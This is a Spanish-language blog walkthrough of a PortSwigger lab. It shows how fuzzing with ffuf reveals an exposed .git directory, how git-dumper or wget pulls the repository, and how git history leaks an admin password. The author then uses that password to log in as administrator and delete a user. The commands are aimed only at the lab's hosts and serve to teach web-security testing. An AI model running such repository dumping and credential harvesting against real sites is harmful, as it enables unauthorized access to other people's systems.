---
title: "Information disclosure in version control history"
description: "Laboratorio de Portswigger sobre Information Disclosure"
date: 2024-12-03 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Information Disclosure
tags:
  - Portswigger Labs
  - Information Disclosure
  - Information disclosure in version control history
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` `revela` información `sensible` a través de su `historial de control de versiones`. Para `resolver` el laboratorio, `obtén` la `contraseña` del `usuario administrador`, luego `inicia sesión` y `elimina` al `usuario` `carlos`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Information-Disclosure-Lab-5/image_1.png)

`Fuzzeamos` la `web`, además de hacerlo desde `Burpsuite` podemos usar herramientas como `fuff` desde `consola`

```
# ffuf -c -t 10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://0a09009203fe839383e93ca700bf000c.web-security-academy.net/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0a09009203fe839383e93ca700bf000c.web-security-academy.net/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git/logs/              [Status: 200, Size: 548, Words: 152, Lines: 19, Duration: 77ms]
.git/index              [Status: 200, Size: 225, Words: 2, Lines: 3, Duration: 132ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 184ms]
.git/config             [Status: 200, Size: 157, Words: 14, Lines: 9, Duration: 171ms]
.git                    [Status: 200, Size: 1201, Words: 256, Lines: 27, Duration: 199ms]
ADMIN                   [Status: 401, Size: 2617, Words: 1049, Lines: 54, Duration: 58ms]
Admin                   [Status: 401, Size: 2617, Words: 1049, Lines: 54, Duration: 54ms]
Login                   [Status: 200, Size: 3192, Words: 1315, Lines: 64, Duration: 52ms]
admin                   [Status: 401, Size: 2617, Words: 1049, Lines: 54, Duration: 54ms]
analytics               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
```

Con `git-dumper` [https://github.com/arthaud/git-dumper.git](https://github.com/arthaud/git-dumper.git) podemos `descargarnos` todo el `.git/` y si queremos una alternativa con `interfaz gráfica` podemos usar `git-cola` [https://github.com/git-cola/git-cola.git](https://github.com/git-cola/git-cola.git)

```
# git-dumper https://0a460009044cee648030a7e300300090.web-security-academy.net/.git/ project
```

Otra alternativa sería `descargarnos` todo usando `wget`

```
# wget -r https://0a460009044cee648030a7e300300090.web-security-academy.net/.git/
```

`Listamos` los `logs`

```
# git log                                          
commit 0de9db705d356593125a122dd61dc2c5b4c059d6 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit 8ce2169ffe2532afaddebd8b63c8cedad993e662
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```

`Vemos` el `último commit` y `obtenemos` una `contraseña`

```
# git show 0de9db705d356593125a122dd61dc2c5b4c059d6
commit 0de9db705d356593125a122dd61dc2c5b4c059d6 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 26742e2..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=z9xi7od0a1z0ar5c36jz
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

Nos `logueamos` con las credenciales `administrator:z9xi7od0a1z0ar5c36jz`

![](/assets/img/Information-Disclosure-Lab-5/image_2.png)

Pulsamos sobre `Admin panel` y le `borramos` la `cuenta` al usuario `carlos`

![](/assets/img/Information-Disclosure-Lab-5/image_3.png)
